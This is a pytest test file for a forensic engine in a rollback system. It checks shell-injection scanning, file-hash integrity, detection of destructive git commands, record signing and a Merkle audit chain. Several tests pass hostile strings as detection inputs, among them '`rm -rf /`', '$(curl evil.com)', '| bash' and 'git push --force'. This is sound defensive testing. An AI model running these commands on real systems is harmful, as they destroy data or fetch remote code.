# [A_test] module_id: SRC-TST-1026 | layer=test | stability=volatile | safety=L | ai_autonomy=ai_modifiable
# [BLUEPRINT] MOD-INF-021 | docs/03_modules/_domain_autonomy_core/rollback_system/blueprint.md | §
# [MODULE] tests.test_forensic
# [DOMAIN] D_GOV_AUDIT
# [INVARIANTS] none
# [MODIFY-GUARD] none
# [CONSUMERS] CI
# [STABILITY] evolving
# [SAFETY] L
# [AI_AUTONOMY] ai_modifiable
# [ERROR_CONTRACT] pytest.Exception
# [TESTS] self
# [A_module] module_id=MOD-INF-021 | layer=module | stability=evolving | safety=L | ai_autonomy=ai_modifiable
# [TTL] task_bound

from __future__ import annotations

import hashlib
import json
import os
from pathlib import Path
from unittest.mock import patch

import pytest

from zephyr.infrastructure.rollback.forensic import (
    ForensicEngine,
    ForensicReport,
    NtpAttestation,
)


@pytest.fixture
def tmp_project(tmp_path):
    return tmp_path


@pytest.fixture
def engine(tmp_project):
    return ForensicEngine(project_root=tmp_project)


class TestForensicEngineInstantiation:
    def test_default_project_root(self):
        eng = ForensicEngine()
        assert eng.project_root == Path.cwd()

    def test_custom_project_root(self, tmp_project):
        eng = ForensicEngine(project_root=tmp_project)
        assert eng.project_root == tmp_project

    def test_forensic_dir_set(self, engine, tmp_project):
        expected = tmp_project / "data" / "rollback" / "forensic"
        assert engine.forensic_dir == expected


class TestScanShellInjection:
    def test_clean_input_no_findings(self, engine):
        findings = engine.scan_shell_injection("deploy", "normal message")
        assert findings == []

    def test_backtick_injection(self, engine):
        findings = engine.scan_shell_injection("trigger", "`rm -rf /`")
        assert len(findings) > 0
        assert any(f.source_field == "message" for f in findings)

    def test_dollar_paren_injection(self, engine):
        findings = engine.scan_shell_injection("$(curl evil.com)", "msg")
        assert len(findings) > 0
        assert any(f.source_field == "trigger" for f in findings)

    def test_semicolon_rm_injection(self, engine):
        findings = engine.scan_shell_injection("trig", "; rm -rf /")
        assert len(findings) > 0

    def test_pipe_bash_injection(self, engine):
        findings = engine.scan_shell_injection("trig", "| bash")
        assert len(findings) > 0

    def test_empty_strings_no_crash(self, engine):
        findings = engine.scan_shell_injection("", "", "")
        assert findings == []

    def test_context_field_scanned(self, engine):
        findings = engine.scan_shell_injection("clean", "clean", "$(whoami)")
        assert len(findings) > 0
        assert any(f.source_field == "context" for f in findings)


class TestIsShellInjectionSafe:
    def test_safe_input(self, engine):
        safe, findings = engine.is_shell_injection_safe("deploy", "normal")
        assert safe is True
        assert findings == []

    def test_unsafe_input(self, engine):
        safe, findings = engine.is_shell_injection_safe("`rm`", "msg")
        assert safe is False
        assert len(findings) > 0


class TestCheckBitRot:
    def test_nonexistent_file(self, engine):
        result = engine.check_bit_rot("nonexistent.txt", "abc123")
        assert result.intact is False
        assert result.actual_hash == "FILE_NOT_FOUND"
        assert result.age_days == -1

    def test_intact_file(self, engine, tmp_project):
        f = tmp_project / "test_file.txt"
        content = "hello world"
        f.write_text(content, encoding="utf-8")
        expected = hashlib.sha256(content.encode("utf-8")).hexdigest()
        result = engine.check_bit_rot("test_file.txt", expected)
        assert result.intact is True
        assert result.actual_hash == expected

    def test_corrupted_file(self, engine, tmp_project):
        f = tmp_project / "corrupt.txt"
        f.write_text("original", encoding="utf-8")
        result = engine.check_bit_rot("corrupt.txt", "wrong_hash")
        assert result.intact is False
        assert result.actual_hash != "wrong_hash"


class TestDetectIrreversibleGitOp:
    def test_reflog_expire(self, engine):
        detected, op = engine.detect_irreversible_git_op("git reflog expire --all")
        assert detected is True
        assert "reflog expire" in op

    def test_push_force(self, engine):
        detected, op = engine.detect_irreversible_git_op("git push --force origin main")
        assert detected is True

    def test_safe_command(self, engine):
        detected, op = engine.detect_irreversible_git_op("git commit -m 'safe'")
        assert detected is False
        assert op == ""

    def test_filter_branch(self, engine):
        detected, op = engine.detect_irreversible_git_op("git filter-branch --tree-filter")
        assert detected is True

    def test_empty_command(self, engine):
        detected, op = engine.detect_irreversible_git_op("")
        assert detected is False


class TestDetectFeatureFlagRollback:
    def test_feature_flag_detected(self, engine):
        assert engine.detect_feature_flag_rollback("feature.flag rollback") is True

    def test_toggle_detected(self, engine):
        assert engine.detect_feature_flag_rollback("toggle switch") is True

    def test_no_feature_flag(self, engine):
        assert engine.detect_feature_flag_rollback("normal git revert") is False

    def test_empty_string(self, engine):
        assert engine.detect_feature_flag_rollback("") is False


class TestHandleFeatureFlagRollback:
    def test_ff_rollback_action(self, engine):
        result = engine.handle_feature_flag_rollback("feature_flag rollback")
        assert result["action"] == "TOGGLE_FEATURE_FLAG"
        assert result["exit_code"] == 33

    def test_git_revert_action(self, engine):
        result = engine.handle_feature_flag_rollback("normal trigger")
        assert result["action"] == "git_revert"
        assert result["exit_code"] == 0


class TestNonRepudiationSign:
    def test_sign_adds_fields(self, engine):
        record = {"key": "value"}
        signed = engine.non_repudiation_sign(record, "secret_key")
        assert "__signature__" in signed
        assert "__signature_algorithm__" in signed
        assert "__signature_timestamp__" in signed
        assert signed["key"] == "value"

    def test_sign_deterministic(self, engine):
        record = {"a": 1}
        s1 = engine.non_repudiation_sign(record, "key1")
        s2 = engine.non_repudiation_sign(record, "key1")
        assert s1["__signature__"] == s2["__signature__"]

    def test_sign_different_keys(self, engine):
        record = {"a": 1}
        s1 = engine.non_repudiation_sign(record, "key1")
        s2 = engine.non_repudiation_sign(record, "key2")
        assert s1["__signature__"] != s2["__signature__"]


class TestVerifyNonRepudiation:
    def test_verify_with_wrong_key_fails(self, engine):
        record = {"key": "value"}
        signed = engine.non_repudiation_sign(record, "correct_key")
        result = engine.verify_non_repudiation(dict(signed))
        assert result is False

    def test_verify_missing_signature(self, engine):
        result = engine.verify_non_repudiation({"key": "value"})
        assert result is False


class TestAtomicWrite:
    def test_write_string(self, engine, tmp_path):
        target = tmp_path / "output.txt"
        assert engine.atomic_write(target, "hello") is True
        assert target.read_text(encoding="utf-8") == "hello"

    def test_write_bytes(self, engine, tmp_path):
        target = tmp_path / "output.bin"
        assert engine.atomic_write(target, b"\x00\x01\x02") is True
        assert target.read_bytes() == b"\x00\x01\x02"

    def test_write_empty_string(self, engine, tmp_path):
        target = tmp_path / "empty.txt"
        assert engine.atomic_write(target, "") is True
        assert target.read_text(encoding="utf-8") == ""


class TestMerkleChain:
    def test_append_and_verify(self, engine):
        engine.forensic_dir.mkdir(parents=True, exist_ok=True)
        link1 = engine.append_merkle_chain("root_aaa", "create", "sha1")
        assert link1.index == 0
        assert link1.prev_root == ""

        link2 = engine.append_merkle_chain("root_bbb", "update", "sha2")
        assert link2.index == 1
        assert link2.prev_root == "root_aaa"

        ok, msg = engine.verify_merkle_chain()
        assert ok is True

    def test_empty_chain_verifies(self, engine):
        ok, msg = engine.verify_merkle_chain()
        assert ok is True

    def test_single_link_verifies(self, engine):
        engine.forensic_dir.mkdir(parents=True, exist_ok=True)
        engine.append_merkle_chain("root_x", "op", "sha")
        ok, msg = engine.verify_merkle_chain()
        assert ok is True


class TestToctouVerify:
    def test_nonexistent_file(self, engine):
        assert engine.toctou_verify("no_such_file.txt", "hash") is False

    def test_matching_hash(self, engine, tmp_project):
        f = tmp_project / "verify_me.txt"
        content = "verify content"
        f.write_text(content, encoding="utf-8")
        expected = hashlib.sha256(content.encode("utf-8")).hexdigest()
        assert engine.toctou_verify("verify_me.txt", expected) is True

    def test_mismatched_hash(self, engine, tmp_project):
        f = tmp_project / "verify_me2.txt"
        f.write_text("content", encoding="utf-8")
        assert engine.toctou_verify("verify_me2.txt", "wrong_hash") is False


class TestCleanupInFlightOrphans:
    def test_no_dir_returns_zero(self, engine):
        assert engine.cleanup_in_flight_orphans() == 0

    def test_cleans_old_entries(self, engine, tmp_project):
        in_flight_dir = tmp_project / ".zephyr" / "rollback_in_flight"
        in_flight_dir.mkdir(parents=True, exist_ok=True)
        record_file = in_flight_dir / "test.json"
        record_file.write_text(json.dumps({"status": "FAILED"}), encoding="utf-8")
        import datetime as dt

        old_ts = (dt.datetime.now(dt.UTC) - dt.timedelta(hours=48)).timestamp()
        os.utime(str(record_file), (old_ts, old_ts))
        count = engine.cleanup_in_flight_orphans(max_age_hours=24)
        assert count == 1
        assert not record_file.exists()


class TestGenerateForensicReport:
    def test_report_structure(self, engine):
        with patch.object(
            engine,
            "ntp_attest",
            return_value=NtpAttestation(
                timestamp_utc="2026-01-01T00:00:00",
                ntp_server="local",
                stratum=16,
                precision=1.0,
                attested=False,
                signature="sig",
            ),
        ):
            report = engine.generate_forensic_report("test_op", trigger="deploy", message="safe")
        assert isinstance(report, ForensicReport)
        assert report.report_id.startswith("FORENSIC-")
        assert isinstance(report.shell_injection_findings, list)
        assert isinstance(report.file_hashes, list)
        assert isinstance(report.bit_rot_checks, list)
        assert isinstance(report.merkle_chain, list)

    def test_report_empty_inputs(self, engine):
        with patch.object(
            engine,
            "ntp_attest",
            return_value=NtpAttestation(
                timestamp_utc="2026-01-01T00:00:00",
                ntp_server="local",
                stratum=16,
                precision=1.0,
                attested=False,
                signature="sig",
            ),
        ):
            report = engine.generate_forensic_report("op")
        assert isinstance(report, ForensicReport)
